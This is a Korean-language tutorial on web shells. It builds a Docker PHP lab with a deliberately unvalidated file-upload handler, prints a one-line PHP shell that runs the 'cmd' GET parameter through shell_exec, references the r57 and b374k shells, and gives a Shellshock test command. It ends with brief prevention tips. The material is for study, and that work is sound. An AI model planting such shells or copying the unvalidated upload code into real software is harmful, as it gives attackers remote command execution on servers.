## web shell

해당 기법들은 공부용으로만 사용하기 바랍니다.

업로드 취약점을 통해 시스템에 명령을 내릴수 있는 코드를 칭하지만 내부적인 코드로 인해서 발생할수 있다.

해당 취약점이 발생되면 시스템에 원격으로 백도어를 심을수 있다.

대표적인 웹셀파일 r57.php 


# 시작하기


테스트 PHP-fpm-Apache을 설치해야한다. 

해당 설치는 도커파일로 대체한다. 다음과 같은 커멘드를 입력하게되면 위의 세팅이 들어간 도커가 실행된다.

```
docker run --rm -p 80:80 -v <sourcePath>:/var/www/html php:7.2-apache
```

```<sourcePath>```폴더에 fileAction.php 파일을 만든후 다음과 같은 코드를 넣는다.


```
//파일업로드 HTML 코드
<form enctype="multipart/form-data" action="fileAction.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="3000000" />
    이 파일을 전송합니다: <input name="userfile" type="file" />
    <input type="submit" value="파일 전송" />
</form>
```


실제 파일의 업로드하는 PHP 코드

move_uploaded_file을 이용하여 파일을 업로드 하는 코드

```
    <?php

    $uploaddir = '/var/www/html/uploads/';
    $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);

    echo '<pre>';
    if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
        echo "파일이 유효하고, 성공적으로 업로드 되었습니다.\n";
    } else {
        print "파일 업로드 실패";
    }

    echo '자세한 디버깅 정보입니다:';
    print_r($_FILES);

    print "</pre>";

    ?>
```

취약점을 가진 php파일을 생성후 

해당 파일을 업로드한다.

![업로드](https://github.com/rinechran/Hws/blob/master/img/fileupload.jpg)
```
<?php
echo shell_exec($_GET['cmd']);
?>
```
그리고 간단한 쉘스크립트를 GET프로토콜에 데이터 파라메타인 cmd에 쉘 스크립트를 실행해보자.

![업로드](https://github.com/rinechran/Hws/blob/master/img/exec.jpg)

위의 작업을 좀더 편하게 해주는 php가 대표적으로 r57.php 이 있다.

php를 업로드하여 들어가보자

![업로드](https://github.com/rinechran/Hws/blob/master/img/b374kmini.jpg)

또한 root가아니여도 2014-6271(Shell Shock) 사태처럼 쉘취약점을 이용하여 root를 탈취 가능하다.

bash Shell 취약점 테스트 

```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```


## 예방법

- 웹 서버의 파일 업로드 취약점 제거

- 파일 업로드 폴더의 실행 제한

- 웹 서버의 실행을 root로 하지말기(이는 예방법은 아니고 최소한의 피해를 방지하기 위한 보호법이라고 보는게 좋다.)

## 타 언어의 webShell

Node :  https://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html
eval같은 취약함수 때문에 발생하기때문에 사용에 주의가 필요하다.


asp : https://github.com/tennc/webshell/blob/master/asp/webshell.asp


## 참조

https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084

http://www.r57.gen.tr/
